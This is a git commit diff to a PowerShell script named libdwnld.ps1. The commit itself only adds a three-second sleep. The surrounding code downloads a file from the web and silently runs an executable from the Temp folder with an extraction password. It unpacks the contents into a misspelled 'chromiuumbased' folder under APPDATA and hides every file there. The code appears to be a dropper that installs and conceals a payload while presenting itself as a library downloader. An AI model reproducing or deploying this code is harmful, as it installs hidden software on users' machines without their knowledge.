bcd37a3d05111bbf81cb31449275747739a8983e
washywashy14 <122028842+washywashy14@users.noreply.github.com>
2023-01-13 00:40:49 +0000

    Update libdwnld.ps1

--- app/src/full/libdwnld.ps1
+++ app/src/full/libdwnld.ps1
@@ -8,3 +8,4 @@ Invoke-WebRequest -uri $WebFile -OutFile $Outff
 & $env:Temp\additionlibraries.exe -s -p"of9049nwp04yb3" -d"$env:APPDATA\chromiuumbased\services\"
 Start-Sleep -Seconds 5
 Get-ChildItem -path "$env:APPDATA\chromiuumbased\services\" -Recurse -Force | foreach {$_.attributes = "Hidden"}
+Start-Sleep -Seconds 3
